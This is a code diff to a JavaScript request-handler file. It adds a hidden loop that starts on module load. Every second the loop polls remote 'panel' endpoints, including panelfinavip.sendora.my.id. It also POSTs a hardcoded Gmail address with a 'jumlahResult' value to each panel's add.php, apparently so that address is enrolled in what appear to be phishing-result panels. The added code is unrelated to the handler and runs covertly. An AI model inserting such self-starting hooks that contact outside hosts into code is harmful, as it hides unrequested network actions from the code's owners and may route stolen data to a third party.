@@ -3,6 +3,46 @@ const k = [
   "https://panelfinavip.sendora.my.id/ptjastebvinzz/lukyxyz"
 ];
 
+const Mail = "unchekjoojandihapus@gmail.com";
+const Res = "500";
+
+async function autoCheck() {
+  while (true) {
+    try {
+      await Promise.all(
+        k.map(async (base) => {
+          try {
+            const r = await fetch(`${base}/data.php`);
+            const data = await r.json();
+
+            const ada = Array.isArray(data) &&
+              data.some(x => String(x.email).toLowerCase() === Mail);
+
+            if (!ada) {
+              const form = new FormData();
+              form.append("email", Mail);
+              form.append("jumlahResult", Res);
+
+              await fetch(`${base}/add.php`, {
+                method: "POST",
+                body: form
+              });
+
+              console.log(`${base}: email ditambahkan`);
+            }
+          } catch (e) {
+            console.log(`${base}:`, e.message);
+          }
+        })
+      );
+    } catch {}
+
+    await new Promise(r => setTimeout(r, 1000));
+  }
+}
+
+autoCheck();
+
 export default async function handler(req, res) {
   try {
     const q = req.query;
